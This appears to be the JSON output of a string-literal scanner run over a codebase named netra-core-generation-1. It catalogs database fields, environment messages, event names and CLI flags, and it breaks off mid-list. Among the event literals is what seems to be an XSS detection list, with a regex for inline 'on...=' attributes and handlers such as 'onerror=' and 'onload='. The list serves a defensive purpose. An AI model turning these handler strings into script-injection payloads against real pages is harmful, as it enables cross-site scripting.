{
  "metadata": {
    "version": "2.0.0",
    "scanner": "focused",
    "generated_at": "2025-08-22T16:36:57.914225",
    "root_directory": "C:\\Users\\antho\\OneDrive\\Desktop\\Netra\\netra-core-generation-1",
    "files_scanned": 2306,
    "total_literals": 65527,
    "unique_literals": 19453
  },
  "categories": {
    "database": {
      "count": 45,
      "literals": {
        "created_at": {
          "value": "created_at",
          "category": "database",
          "locations": []
        },
        "created_at <= '": {
          "value": "created_at <= '",
          "category": "database",
          "locations": []
        },
        "created_at >= '": {
          "value": "created_at >= '",
          "category": "database",
          "locations": []
        },
        "created_at DateTime64(3) DEFAULT now()": {
          "value": "created_at DateTime64(3) DEFAULT now()",
          "category": "database",
          "locations": []
        },
        "deleted_at": {
          "value": "deleted_at",
          "category": "database",
          "locations": []
        },
        "id": {
          "value": "id",
          "category": "database",
          "locations": []
        },
        "id:": {
          "value": "id:",
          "category": "database",
          "locations": []
        },
        "id_field": {
          "value": "id_field",
          "category": "database",
          "locations": []
        },
        "id_token": {
          "value": "id_token",
          "category": "database",
          "locations": []
        },
        "identified_date": {
          "value": "identified_date",
          "category": "database",
          "locations": []
        },
        "identifier": {
          "value": "identifier",
          "category": "database",
          "locations": []
        },
        "identifiers": {
          "value": "identifiers",
          "category": "database",
          "locations": []
        },
        "identify_latency_bottlenecks": {
          "value": "identify_latency_bottlenecks",
          "category": "database",
          "locations": []
        },
        "identify_outliers": {
          "value": "identify_outliers",
          "category": "database",
          "locations": []
        },
        "identify_patterns": {
          "value": "identify_patterns",
          "category": "database",
          "locations": []
        },
        "identity_context": {
          "value": "identity_context",
          "category": "database",
          "locations": []
        },
        "identity_context_user_id UUID,\n        identity_context_organization_id String,\n        identity_context_api_key_hash String,\n        identity_context_auth_method String": {
          "value": "identity_context_user_id UUID,\n        identity_context_organization_id String,\n        identity_context_api_key_hash String,\n        identity_context_auth_method String",
          "category": "database",
          "locations": []
        },
        "idle": {
          "value": "idle",
          "category": "database",
          "locations": []
        },
        "idle_agents": {
          "value": "idle_agents",
          "category": "database",
          "locations": []
        },
        "idle_connections": {
          "value": "idle_connections",
          "category": "database",
          "locations": []
        },
        "ids": {
          "value": "ids",
          "category": "database",
          "locations": []
        },
        "idx > 0 as has_latency, idx2 > 0 as has_throughput, idx3 > 0 as has_cost": {
          "value": "idx > 0 as has_latency, idx2 > 0 as has_throughput, idx3 > 0 as has_cost",
          "category": "database",
          "locations": []
        },
        "idx_": {
          "value": "idx_",
          "category": "database",
          "locations": []
        },
        "idx_agent_state_expires": {
          "value": "idx_agent_state_expires",
          "category": "database",
          "locations": []
        },
        "idx_agent_state_recovery": {
          "value": "idx_agent_state_recovery",
          "category": "database",
          "locations": []
        },
        "idx_agent_state_run_created": {
          "value": "idx_agent_state_run_created",
          "category": "database",
          "locations": []
        },
        "idx_agent_state_thread_created": {
          "value": "idx_agent_state_thread_created",
          "category": "database",
          "locations": []
        },
        "idx_recovery_auto": {
          "value": "idx_recovery_auto",
          "category": "database",
          "locations": []
        },
        "idx_recovery_run_initiated": {
          "value": "idx_recovery_run_initiated",
          "category": "database",
          "locations": []
        },
        "idx_recovery_status": {
          "value": "idx_recovery_status",
          "category": "database",
          "locations": []
        },
        "idx_state_tx_run_status": {
          "value": "idx_state_tx_run_status",
          "category": "database",
          "locations": []
        },
        "idx_state_tx_started": {
          "value": "idx_state_tx_started",
          "category": "database",
          "locations": []
        },
        "idx_userbase_created_at": {
          "value": "idx_userbase_created_at",
          "category": "database",
          "locations": []
        },
        "idx_userbase_email": {
          "value": "idx_userbase_email",
          "category": "database",
          "locations": []
        },
        "idx_userbase_plan_tier_is_active": {
          "value": "idx_userbase_plan_tier_is_active",
          "category": "database",
          "locations": []
        },
        "idx_userbase_role_is_developer": {
          "value": "idx_userbase_role_is_developer",
          "category": "database",
          "locations": []
        },
        "thread_id": {
          "value": "thread_id",
          "category": "database",
          "locations": []
        },
        "thread_ids": {
          "value": "thread_ids",
          "category": "database",
          "locations": []
        },
        "updated_at": {
          "value": "updated_at",
          "category": "database",
          "locations": []
        },
        "user_id": {
          "value": "user_id",
          "category": "database",
          "locations": []
        },
        "user_id required in metadata": {
          "value": "user_id required in metadata",
          "category": "database",
          "locations": []
        },
        "user_id,\n                toDate(timestamp) as date,\n                count() as activity_count,\n                uniq(session_id) as unique_sessions": {
          "value": "user_id,\n                toDate(timestamp) as date,\n                count() as activity_count,\n                uniq(session_id) as unique_sessions",
          "category": "database",
          "locations": []
        },
        "user_id_context": {
          "value": "user_id_context",
          "category": "database",
          "locations": []
        },
        "user_id_valid": {
          "value": "user_id_valid",
          "category": "database",
          "locations": []
        },
        "user_ids": {
          "value": "user_ids",
          "category": "database",
          "locations": []
        }
      }
    },
    "environment": {
      "count": 8,
      "literals": {
        "API_DOCUMENTATION.md": {
          "value": "API_DOCUMENTATION.md",
          "category": "environment",
          "locations": []
        },
        "AUTH_SERVICE_URL=http://localhost:8081": {
          "value": "AUTH_SERVICE_URL=http://localhost:8081",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL environment variable is not set": {
          "value": "DATABASE_URL environment variable is not set",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL is not configured": {
          "value": "DATABASE_URL is not configured",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL not configured": {
          "value": "DATABASE_URL not configured",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL not configured in unified configuration": {
          "value": "DATABASE_URL not configured in unified configuration",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL=database-url-staging:latest,JWT_SECRET_KEY=jwt-secret-key-staging:latest,SECRET_KEY=session-secret-key-staging:latest,OPENAI_API_KEY=openai-api-key-staging:latest,FERNET_KEY=fernet-key-staging:latest": {
          "value": "DATABASE_URL=database-url-staging:latest,JWT_SECRET_KEY=jwt-secret-key-staging:latest,SECRET_KEY=session-secret-key-staging:latest,OPENAI_API_KEY=openai-api-key-staging:latest,FERNET_KEY=fernet-key-staging:latest",
          "category": "environment",
          "locations": []
        },
        "DATABASE_URL=database-url-staging:latest,JWT_SECRET_KEY=jwt-secret-staging:latest": {
          "value": "DATABASE_URL=database-url-staging:latest,JWT_SECRET_KEY=jwt-secret-staging:latest",
          "category": "environment",
          "locations": []
        }
      }
    },
    "events": {
      "count": 39,
      "literals": {
        "_event": {
          "value": "_event",
          "category": "events",
          "locations": []
        },
        "auth_event": {
          "value": "auth_event",
          "category": "events",
          "locations": []
        },
        "broadcast": {
          "value": "broadcast",
          "category": "events",
          "locations": []
        },
        "broadcast_": {
          "value": "broadcast_",
          "category": "events",
          "locations": []
        },
        "broadcast_context": {
          "value": "broadcast_context",
          "category": "events",
          "locations": []
        },
        "broadcast_metrics": {
          "value": "broadcast_metrics",
          "category": "events",
          "locations": []
        },
        "broadcast_result": {
          "value": "broadcast_result",
          "category": "events",
          "locations": []
        },
        "broadcast_stats": {
          "value": "broadcast_stats",
          "category": "events",
          "locations": []
        },
        "broadcast_timestamp": {
          "value": "broadcast_timestamp",
          "category": "events",
          "locations": []
        },
        "broadcast_to_job": {
          "value": "broadcast_to_job",
          "category": "events",
          "locations": []
        },
        "broadcast_utils": {
          "value": "broadcast_utils",
          "category": "events",
          "locations": []
        },
        "business_event": {
          "value": "business_event",
          "category": "events",
          "locations": []
        },
        "cost_per_event": {
          "value": "cost_per_event",
          "category": "events",
          "locations": []
        },
        "emit": {
          "value": "emit",
          "category": "events",
          "locations": []
        },
        "emit_event": {
          "value": "emit_event",
          "category": "events",
          "locations": []
        },
        "filtered_by_event": {
          "value": "filtered_by_event",
          "category": "events",
          "locations": []
        },
        "high_cost_per_event": {
          "value": "high_cost_per_event",
          "category": "events",
          "locations": []
        },
        "listener": {
          "value": "listener",
          "category": "events",
          "locations": []
        },
        "listeners": {
          "value": "listeners",
          "category": "events",
          "locations": []
        },
        "listening": {
          "value": "listening",
          "category": "events",
          "locations": []
        },
        "llm_event": {
          "value": "llm_event",
          "category": "events",
          "locations": []
        },
        "newest_event": {
          "value": "newest_event",
          "category": "events",
          "locations": []
        },
        "oldest_event": {
          "value": "oldest_event",
          "category": "events",
          "locations": []
        },
        "on": {
          "value": "on",
          "category": "events",
          "locations": []
        },
        "on\\w+\\s*=": {
          "value": "on\\w+\\s*=",
          "category": "events",
          "locations": []
        },
        "on_": {
          "value": "on_",
          "category": "events",
          "locations": []
        },
        "on_complete": {
          "value": "on_complete",
          "category": "events",
          "locations": []
        },
        "on_error": {
          "value": "on_error",
          "category": "events",
          "locations": []
        },
        "on_message_received": {
          "value": "on_message_received",
          "category": "events",
          "locations": []
        },
        "on_retry": {
          "value": "on_retry",
          "category": "events",
          "locations": []
        },
        "on_success": {
          "value": "on_success",
          "category": "events",
          "locations": []
        },
        "onboarding": {
          "value": "onboarding",
          "category": "events",
          "locations": []
        },
        "onclick=": {
          "value": "onclick=",
          "category": "events",
          "locations": []
        },
        "one could argue": {
          "value": "one could argue",
          "category": "events",
          "locations": []
        },
        "onerror=": {
          "value": "onerror=",
          "category": "events",
          "locations": []
        },
        "onload=": {
          "value": "onload=",
          "category": "events",
          "locations": []
        },
        "onmouseover=": {
          "value": "onmouseover=",
          "category": "events",
          "locations": []
        },
        "trigger_event": {
          "value": "trigger_event",
          "category": "events",
          "locations": []
        },
        "websocket_event": {
          "value": "websocket_event",
          "category": "events",
          "locations": []
        }
      }
    },
    "identifiers": {
      "count": 11139,
      "literals": {
        "--abbrev-ref": {
          "value": "--abbrev-ref",
          "category": "identifiers",
          "locations": []
        },
        "--absolute-only": {
          "value": "--absolute-only",
          "category": "identifiers",
          "locations": []
        },
        "--action": {
          "value": "--action",
          "category": "identifiers",
          "locations": []
        },
        "--activate": {
          "value": "--activate",
          "category": "identifiers",
          "locations": []
        },
        "--add-cloudsql-instances": {
          "value": "--add-cloudsql-instances",
          "category": "identifiers",
          "locations": []
        },
        "--agent": {
          "value": "--agent",
          "category": "identifiers",
          "locations": []
        },
        "--all": {
          "value": "--all",
          "category": "identifiers",
          "locations": []
        },
        "--allow-unauthenticated": {
          "value": "--allow-unauthenticated",
          "category": "identifiers",
          "locations": []
        },
        "--api-url": {
          "value": "--api-url",
          "category": "identifiers",
          "locations": []
        },
        "--assess": {
          "value": "--assess",
          "category": "identifiers",
          "locations": []
        },
        "--auto": {
          "value": "--auto",
          "category": "identifiers",
          "locations": []
        },
        "--auto-fix": {
          "value": "--auto-fix",
          "category": "identifiers",
          "locations": []
        },
        "--auto-restart": {
          "value": "--auto-restart",
          "category": "identifiers",
          "locations": []
        },
        "--backend-port": {
          "value": "--backend-port",
          "category": "identifiers",
          "locations": []
        },
        "--batch": {
          "value": "--batch",
          "category": "identifiers",
          "locations": []
        },
        "--build-arg": {
          "value": "--build-arg",
          "category": "identifiers",
          "locations": []
        },
        "--build-local": {
          "value": "--build-local",
          "category": "identifiers",
          "locations": []
        },
        "--categories": {
          "value": "--categories",
          "category": "identifiers",
          "locations": []
        },
        "--category": {
          "value": "--category",
          "category": "identifiers",
          "locations": []
        },
        "--change-type": {
          "value": "--change-type",
          "category": "identifiers",
          "locations": []
        },
        "--changes": {
          "value": "--changes",
          "category": "identifiers",
          "locations": []
        },
        "--check": {
          "value": "--check",
          "category": "identifiers",
          "locations": []
        },
        "--check-all": {
          "value": "--check-all",
          "category": "identifiers",
          "locations": []
        },
        "--check-file-boundaries": {
          "value": "--check-file-boundaries",
          "category": "identifiers",
          "locations": []
        },
        "--check-files-only": {
          "value": "--check-files-only",
          "category": "identifiers",
          "locations": []
        },
        "--check-function-boundaries": {
          "value": "--check-function-boundaries",
          "category": "identifiers",
          "locations": []
        },
        "--check-functions-only": {
          "value": "--check-functions-only",
          "category": "identifiers",
          "locations": []
        },
        "--check-stubs": {
          "value": "--check-stubs",
          "category": "identifiers",
          "locations": []
        },
        "--check-test-limits": {
          "value": "--check-test-limits",
          "category": "identifiers",
          "locations": []
        },
        "--check-types": {
          "value": "--check-types",
          "category": "identifiers",
          "locations": []
        },
        "--ci": {
          "value": "--ci",
          "category": "identifiers",
          "locations": []
        },
        "--clean": {
          "value": "--clean",
          "category": "identifiers",
          "locations": []
        },
        "--cleanup": {
          "value": "--cleanup",
          "category": "identifiers",
          "locations": []
        },
        "--cli-only": {
          "value": "--cli-only",
          "category": "identifiers",
          "locations": []
        },
        "--config": {
          "value": "--config",
          "category": "identifiers",
          "locations": []
        },
        "--config-file": {
          "value": "--config-file",
          "category": "identifiers",
          "locations": []
        },
        "--continuous": {
          "value": "--continuous",
          "category": "identifiers",
          "locations": []
        },
        "--corpus-file": {
          "value": "--corpus-file",
          "category": "identifiers",
          "locations": []
        },
        "--count": {
          "value": "--count",
          "category": "identifiers",
          "locations": []
        },
        "--coverage": {
          "value": "--coverage",
          "category": "identifiers",
          "locations": []
        },
        "--cpu": {
          "value": "--cpu",
          "category": "identifiers",
          "locations": []
        },
        "--cpus": {
          "value": "--cpus",
          "category": "identifiers",
          "locations": []
        },
        "--create-db": {
          "value": "--create-db",
          "category": "identifiers",
          "locations": []
        },
        "--daily": {
          "value": "--daily",
          "category": "identifiers",
          "locations": []
        },
        "--days": {
          "value": "--days",
          "category": "identifiers",
          "locations": []
        },
        "--deployment-time": {
          "value": "--deployment-time",
          "category": "identifiers",
          "locations": []
        },
        "--depth": {
          "value": "--depth",
          "category": "identifiers",
          "locations": []
        },
        "--diagnose": {
          "value": "--diagnose",
          "category": "identifiers",
          "locations": []
        },
        "--dirs": {
          "value": "--dirs",
          "category": "identifiers",
          "locations": []
        },
        "--disable": {
          "value": "--disable",
          "category": "identifiers",
          "locations": []
        },
        "--disable-warnings": {
          "value": "--disable-warnings",
          "category": "identifiers",
          "locations": []
        },
        "--dry-run": {
          "value": "--dry-run",
          "category": "identifiers",
          "locations": []
        },
        "--dynamic": {
          "value": "--dynamic",
          "category": "identifiers",
          "locations": []
        },
        "--emergency-only": {
          "value": "--emergency-only",
          "category": "identifiers",
          "locations": []
        },
        "--enable": {
          "value": "--enable",
          "category": "identifiers",
          "locations": []
        },
        "--enabled": {
          "value": "--enabled",
          "category": "identifiers",
          "locations": []
        },
        "--enforce": {
          "value": "--enforce",
          "category": "identifiers",
          "locations": []
        },
        "--enhanced": {
          "value": "--enhanced",
          "category": "identifiers",
          "locations": []
        },
        "--enhanced-mode": {
          "value": "--enhanced-mode",
          "category": "identifiers",
          "locations": []
        },
        "--env": {
          "value": "--env",
          "category": "identifiers",
          "locations": []
        },
        "--env-file": {
          "value": "--env-file",
          "category": "identifiers",
          "locations": []
        },
        "--environment": {
          "value": "--environment",
          "category": "identifiers",
          "locations": []
        },
        "--error": {
          "value": "--error",
          "category": "identifiers",
          "locations": []
        },
        "--exclude-pattern": {
          "value": "--exclude-pattern",
          "category": "identifiers",
          "locations": []
        },
        "--execute": {
          "value": "--execute",
          "category": "identifiers",
          "locations": []
        },
        "--fail-fast": {
          "value": "--fail-fast",
          "category": "identifiers",
          "locations": []
        },
        "--fail-on-critical": {
          "value": "--fail-on-critical",
          "category": "identifiers",
          "locations": []
        },
        "--fail-on-emergency": {
          "value": "--fail-on-emergency",
          "category": "identifiers",
          "locations": []
        },
        "--fail-on-stubs": {
          "value": "--fail-on-stubs",
          "category": "identifiers",
          "locations": []
        },
        "--fail-on-violation": {
          "value": "--fail-on-violation",
          "category": "identifiers",
          "locations": []
        },
        "--fail-on-violations": {
          "value": "--fail-on-violations",
          "category": "identifiers",
          "locations": []
        },
        "--fast": {
          "value": "--fast",
          "category": "identifiers",
          "locations": []
        },
        "--fast-fail": {
          "value": "--fast-fail",
          "category": "identifiers",
          "locations": []
        },
        "--file": {
          "value": "--file",
          "category": "identifiers",
          "locations": []
        },
        "--filter": {
          "value": "--filter",
          "category": "identifiers",
          "locations": []
        },
        "--fix": {
          "value": "--fix",
          "category": "identifiers",
          "locations": []
        },
        "--fix-issues": {
          "value": "--fix-issues",
          "category": "identifiers",
          "locations": []
        },
        "--fix-suggestions": {
          "value": "--fix-suggestions",
          "category": "identifiers",
          "locations": []
        },
        "--focus": {
          "value": "--focus",
          "category": "identifiers",
          "locations": []
        },
        "--force": {
          "value": "--force",
          "category": "identifiers",
          "locations": []
        },
        "--format": {
          "value": "--format",
          "category": "identifiers",
          "locations": []
        },
        "--frontend-port": {
          "value": "--frontend-port",
          "category": "identifiers",
          "locations": []
        },
        "--full-analysis": {
          "value": "--full-analysis",
          "category": "identifiers",
          "locations": []
        },
        "--grep": {
          "value": "--grep",
          "category": "identifiers",
          "locations": []
        },
        "--heads": {
          "value": "--heads",
          "category": "identifiers",
          "locations": []
        },
        "--help": {
          "value": "--help",
          "category": "identifiers",
          "locations": []
        },
        "--host": {
          "value": "--host",
          "category": "identifiers",
          "locations": []
        },
        "--ignore-folders": {
          "value": "--ignore-folders",
          "category": "identifiers",
          "locations": []
        },
        "--image": {
          "value": "--image",
          "category": "identifiers",
          "locations": []
        },
        "--import-only": {
          "value": "--import-only",
          "category": "identifiers",
          "locations": []
        },
        "--inactive-hours": {
          "value": "--inactive-hours",
          "category": "identifiers",
          "locations": []
        },
        "--include-confidence": {
          "value": "--include-confidence",
          "category": "identifiers",
          "locations": []
        },
        "--include-pattern": {
          "value": "--include-pattern",
          "category": "identifiers",
          "locations": []
        },
        "--include-tests": {
          "value": "--include-tests",
          "category": "identifiers",
          "locations": []
        },
        "--index": {
          "value": "--index",
          "category": "identifiers",
          "locations": []
        },
        "--input": {
          "value": "--input",
          "category": "identifiers",
          "locations": []
        },
        "--input-dir": {
          "value": "--input-dir",
          "category": "identifiers",
          "locations": []
        },
        "--install-hook": {
          "value": "--install-hook",
          "category": "identifiers",
          "locations": []
        },
        "--install-hooks": {
          "value": "--install-hooks",
          "category": "identifiers",
          "locations": []
        },
        "--interval": {
          "value": "--interval",
          "category": "identifiers",
          "locations": []
        },
        "--job": {
          "value": "--job",
          "category": "identifiers",
          "locations": []
        },
        "--json": {
          "value": "--json",
          "category": "identifiers",
          "locations": []
        },
        "--json-only": {
          "value": "--json-only",
          "category": "identifiers",
          "locations": []
        },
        "--json-output": {
          "value": "--json-output",
          "category": "identifiers",
          "locations": []
        },
        "--keep-failed": {
          "value": "--keep-failed",
          "category": "identifiers",
          "locations": []
        },
        "--left-right": {
          "value": "--left-right",
          "category": "identifiers",
          "locations": []
        },
        "--lenient": {
          "value": "--lenient",
          "category": "identifiers",
          "locations": []
        },
        "--level": {
          "value": "--level",
          "category": "identifiers",
          "locations": []
        },
        "--limit": {
          "value": "--limit",
          "category": "identifiers",
          "locations": []
        },
        "--load-secrets": {
          "value": "--load-secrets",
          "category": "identifiers",
          "locations": []
        },
        "--local-only": {
          "value": "--local-only",
          "category": "identifiers",
          "locations": []
        },
        "--log": {
          "value": "--log",
          "category": "identifiers",
          "locations": []
        },
        "--logs": {
          "value": "--logs",
          "category": "identifiers",
          "locations": []
        },
        "--machine-type": {
          "value": "--machine-type",
          "category": "identifiers",
          "locations": []
        },
        "--max-age-days": {
          "value": "--max-age-days",
          "category": "identifiers",
          "locations": []
        },
        "--max-cores": {
          "value": "--max-cores",
          "category": "identifiers",
          "locations": []
        },
        "--max-cost-per-pr": {
          "value": "--max-cost-per-pr",
          "category": "identifiers",
          "locations": []
        },
        "--max-file-lines": {
          "value": "--max-file-lines",
          "category": "identifiers",
          "locations": []
        },
        "--max-function-lines": {
          "value": "--max-function-lines",
          "category": "identifiers",
          "locations": []
        },
        "--max-instances": {
          "value": "--max-instances",
          "category": "identifiers",
          "locations": []
        },
        "--max-lines": {
          "value": "--max-lines",
          "category": "identifiers",
          "locations": []
        },
        "--memory": {
          "value": "--memory",
          "category": "identifiers",
          "locations": []
        },
        "--merged": {
          "value": "--merged",
          "category": "identifiers",
          "locations": []
        },
        "--merges": {
          "value": "--merges",
          "category": "identifiers",
          "locations": []
        },
        "--messages-per-thread": {
          "value": "--messages-per-thread",
          "category": "identifiers",
          "locations": []
        },
        "--metrics": {
          "value": "--metrics",
          "category": "identifiers",
          "locations": []
        },
        "--migrate": {
          "value": "--migrate",
          "category": "identifiers",
          "locations": []
        },
        "--migration-mode": {
          "value": "--migration-mode",
          "category": "identifiers",
          "locations": []
        },
        "--min-instances": {
          "value": "--min-instances",
          "category": "identifiers",
          "locations": []
        },
        "--mode": {
          "value": "--mode",
          "category": "identifiers",
          "locations": []
        },
        "--model": {
          "value": "--model",
          "category": "identifiers",
          "locations": []
        },
        "--modules": {
          "value": "--modules",
          "category": "identifiers",
          "locations": []
        },
        "--monitor": {
          "value": "--monitor",
          "category": "identifiers",
          "locations": []
        },
        "--monthly": {
          "value": "--monthly",
          "category": "identifiers",
          "locations": []
        },
        "--name-only": {
          "value": "--name-only",
          "category": "identifiers",
          "locations": []
        },
        "--name-status": {
          "value": "--name-status",
          "category": "identifiers",
          "locations": []
        },
        "--network": {
          "value": "--network",
          "category": "identifiers",
          "locations": []
        },
        "--no-backend-reload": {
          "value": "--no-backend-reload",
          "category": "identifiers",
          "locations": []
        },
        "--no-browser": {
          "value": "--no-browser",
          "category": "identifiers",
          "locations": []
        },
        "--no-commit-id": {
          "value": "--no-commit-id",
          "category": "identifiers",
          "locations": []
        },
        "--no-cov": {
          "value": "--no-cov",
          "category": "identifiers",
          "locations": []
        },
        "--no-coverage": {
          "value": "--no-coverage",
          "category": "identifiers",
          "locations": []
        },
        "--no-cpu-throttling": {
          "value": "--no-cpu-throttling",
          "category": "identifiers",
          "locations": []
        },
        "--no-duplicates": {
          "value": "--no-duplicates",
          "category": "identifiers",
          "locations": []
        },
        "--no-emoji": {
          "value": "--no-emoji",
          "category": "identifiers",
          "locations": []
        },
        "--no-frontend-reload": {
          "value": "--no-frontend-reload",
          "category": "identifiers",
          "locations": []
        },
        "--no-header": {
          "value": "--no-header",
          "category": "identifiers",
          "locations": []
        },
        "--no-reload": {
          "value": "--no-reload",
          "category": "identifiers",
          "locations": []
        },
        "--no-smart-limits": {
          "value": "--no-smart-limits",
          "category": "identifiers",
          "locations": []
        },
        "--no-test-limits": {
          "value": "--no-test-limits",
          "category": "identifiers",
          "locations": []
        },
        "--no-turbopack": {
          "value": "--no-turbopack",
          "category": "identifiers",
          "locations": []
        },
        "--num-traces": {
          "value": "--num-traces",
          "category": "identifiers",
          "locations": []
        },
        "--numstat": {
          "value": "--numstat",
          "category": "identifiers",
          "locations": []
        },
        "--oneline": {
          "value": "--oneline",
          "category": "identifiers",
          "locations": []
        },
        "--optimizations": {
          "value": "--optimizations",
          "category": "identifiers",
          "locations": []
        },
        "--output": {
          "value": "--output",
          "category": "identifiers",
          "locations": []
        },
        "--output-coverage": {
          "value": "--output-coverage",
          "category": "identifiers",
          "locations": []
        },
        "--output-dir": {
          "value": "--output-dir",
          "category": "identifiers",
          "locations": []
        },
        "--output-file": {
          "value": "--output-file",
          "category": "identifiers",
          "locations": []
        },
        "--output-html": {
          "value": "--output-html",
          "category": "identifiers",
          "locations": []
        },
        "--output-json": {
          "value": "--output-json",
          "category": "identifiers",
          "locations": []
        },
        "--outputs": {
          "value": "--outputs",
          "category": "identifiers",
          "locations": []
        },
        "--override-ini": {
          "value": "--override-ini",
          "category": "identifiers",
          "locations": []
        },
        "--path": {
          "value": "--path",
          "category": "identifiers",
          "locations": []
        },
        "--platform": {
          "value": "--platform",
          "category": "identifiers",
          "locations": []
        },
        "--poll-interval": {
          "value": "--poll-interval",
          "category": "identifiers",
          "locations": []
        },
        "--porcelain": {
          "value": "--porcelain",
          "category": "identifiers",
          "locations": []
        },
        "--port": {
          "value": "--port",
          "category": "identifiers",
          "locations": []
        },
        "--pr-comment": {
          "value": "--pr-comment",
          "category": "identifiers",
          "locations": []
        },
        "--pr-number": {
          "value": "--pr-number",
          "category": "identifiers",
          "locations": []
        },
        "--prevent-duplicates": {
          "value": "--prevent-duplicates",
          "category": "identifiers",
          "locations": []
        },
        "--progress": {
          "value": "--progress",
          "category": "identifiers",
          "locations": []
        },
        "--project": {
          "value": "--project",
          "category": "identifiers",
          "locations": []
        },
        "--project-id": {
          "value": "--project-id",
          "category": "identifiers",
          "locations": []
        },
        "--project-root": {
          "value": "--project-root",
          "category": "identifiers",
          "locations": []
        },
        "--prompt": {
          "value": "--prompt",
          "category": "identifiers",
          "locations": []
        },
        "--provider": {
          "value": "--provider",
          "category": "identifiers",
          "locations": []
        },
        "--quick": {
          "value": "--quick",
          "category": "identifiers",
          "locations": []
        },
        "--quiet": {
          "value": "--quiet",
          "category": "identifiers",
          "locations": []
        },
        "--raiseerr": {
          "value": "--raiseerr",
          "category": "identifiers",
          "locations": []
        },
        "--read-only": {
          "value": "--read-only",
          "category": "identifiers",
          "locations": []
        },
        "--readme-api-key": {
          "value": "--readme-api-key",
          "category": "identifiers",
          "locations": []
        },
        "--readme-url": {
          "value": "--readme-url",
          "category": "identifiers",
          "locations": []
        },
        "--readme-version": {
          "value": "--readme-version",
          "category": "identifiers",
          "locations": []
        },
        "--reason": {
          "value": "--reason",
          "category": "identifiers",
          "locations": []
        },
        "--recent-commits": {
          "value": "--recent-commits",
          "category": "identifiers",
          "locations": []
        },
        "--region": {
          "value": "--region",
          "category": "identifiers",
          "locations": []
        },
        "--reload": {
          "value": "--reload",
          "category": "identifiers",
          "locations": []
        },
        "--remote-only": {
          "value": "--remote-only",
          "category": "identifiers",
          "locations": []
        },
        "--repo": {
          "value": "--repo",
          "category": "identifiers",
          "locations": []
        },
        "--report": {
          "value": "--report",
          "category": "identifiers",
          "locations": []
        },
        "--results-dir": {
          "value": "--results-dir",
          "category": "identifiers",
          "locations": []
        },
        "--risk": {
          "value": "--risk",
          "category": "identifiers",
          "locations": []
        },
        "--rm": {
          "value": "--rm",
          "category": "identifiers",
          "locations": []
        },
        "--root": {
          "value": "--root",
          "category": "identifiers",
          "locations": []
        },
        "--run-checks": {
          "value": "--run-checks",
          "category": "identifiers",
          "locations": []
        },
        "--run-id": {
          "value": "--run-id",
          "category": "identifiers",
          "locations": []
        },
        "--samples-per-type": {
          "value": "--samples-per-type",
          "category": "identifiers",
          "locations": []
        },
        "--scan": {
          "value": "--scan",
          "category": "identifiers",
          "locations": []
        },
        "--scope": {
          "value": "--scope",
          "category": "identifiers",
          "locations": []
        },
        "--secret": {
          "value": "--secret",
          "category": "identifiers",
          "locations": []
        },
        "--secret-file": {
          "value": "--secret-file",
          "category": "identifiers",
          "locations": []
        },
        "--service": {
          "value": "--service",
          "category": "identifiers",
          "locations": []
        },
        "--services": {
          "value": "--services",
          "category": "identifiers",
          "locations": []
        },
        "--set-env-vars": {
          "value": "--set-env-vars",
          "category": "identifiers",
          "locations": []
        },
        "--set-secrets": {
          "value": "--set-secrets",
          "category": "identifiers",
          "locations": []
        },
        "--short": {
          "value": "--short",
          "category": "identifiers",
          "locations": []
        },
        "--show-all": {
          "value": "--show-all",
          "category": "identifiers",
          "locations": []
        },
        "--since": {
          "value": "--since",
          "category": "identifiers",
          "locations": []
        },
        "--single-run": {
          "value": "--single-run",
          "category": "identifiers",
          "locations": []
        },
        "--skip-backup": {
          "value": "--skip-backup",
          "category": "identifiers",
          "locations": []
        },
        "--skip-build": {
          "value": "--skip-build",
          "category": "identifiers",
          "locations": []
        },
        "--skip-database": {
          "value": "--skip-database",
          "category": "identifiers",
          "locations": []
        },
        "--skip-validation": {
          "value": "--skip-validation",
          "category": "identifiers",
          "locations": []
        },
        "--smart-generate": {
          "value": "--smart-generate",
          "category": "identifiers",
          "locations": []
        },
        "--staging": {
          "value": "--staging",
          "category": "identifiers",
          "locations": []
        },
        "--stat": {
          "value": "--stat",
          "category": "identifiers",
          "locations": []
        },
        "--status": {
          "value": "--status",
          "category": "identifiers",
          "locations": []
        },
        "--strict": {
          "value": "--strict",
          "category": "identifiers",
          "locations": []
        },
        "--sync-readme": {
          "value": "--sync-readme",
          "category": "identifiers",
          "locations": []
        },
        "--tag": {
          "value": "--tag",
          "category": "identifiers",
          "locations": []
        },
        "--target-coverage": {
          "value": "--target-coverage",
          "category": "identifiers",
          "locations": []
        },
        "--target-folders": {
          "value": "--target-folders",
          "category": "identifiers",
          "locations": []
        },
        "--task": {
          "value": "--task",
          "category": "identifiers",
          "locations": []
        },
        "--task-id": {
          "value": "--task-id",
          "category": "identifiers",
          "locations": []
        },
        "--temperature": {
          "value": "--temperature",
          "category": "identifiers",
          "locations": []
        },
        "--test": {
          "value": "--test",
          "category": "identifiers",
          "locations": []
        },
        "--test-suggestions": {
          "value": "--test-suggestions",
          "category": "identifiers",
          "locations": []
        },
        "--threads-per-user": {
          "value": "--threads-per-user",
          "category": "identifiers",
          "locations": []
        },
        "--threshold": {
          "value": "--threshold",
          "category": "identifiers",
          "locations": []
        },
        "--time-frame": {
          "value": "--time-frame",
          "category": "identifiers",
          "locations": []
        },
        "--timeout": {
          "value": "--timeout",
          "category": "identifiers",
          "locations": []
        },
        "--token": {
          "value": "--token",
          "category": "identifiers",
          "locations": []
        },
        "--top-k": {
          "value": "--top-k",
          "category": "identifiers",
          "locations": []
        },
        "--top-p": {
          "value": "--top-p",
          "category": "identifiers",
          "locations": []
        },
        "--ultra-think": {
          "value": "--ultra-think",
          "category": "identifiers",
          "locations": []
        },
        "--update-env-vars": {
          "value": "--update-env-vars",
          "category": "identifiers",
          "locations": []
        },
        "--update-secrets": {
          "value": "--update-secrets",
          "category": "identifiers",
          "locations": []
        },
        "--upgrade": {
          "value": "--upgrade",
          "category": "identifiers",
          "locations": []
        },
        "--user": {
          "value": "--user",
          "category": "identifiers",
          "locations": []
        },
        "--users": {
          "value": "--users",
          "category": "identifiers",
          "locations": []
        },
        "--validate": {
          "value": "--validate",
          "category": "identifiers",
          "locations": []
        },
        "--validate-only": {
          "value": "--validate-only",
          "category": "identifiers",
          "locations": []
        },
        "--validation-level": {
          "value": "--validation-level",
          "category": "identifiers",
          "locations": []
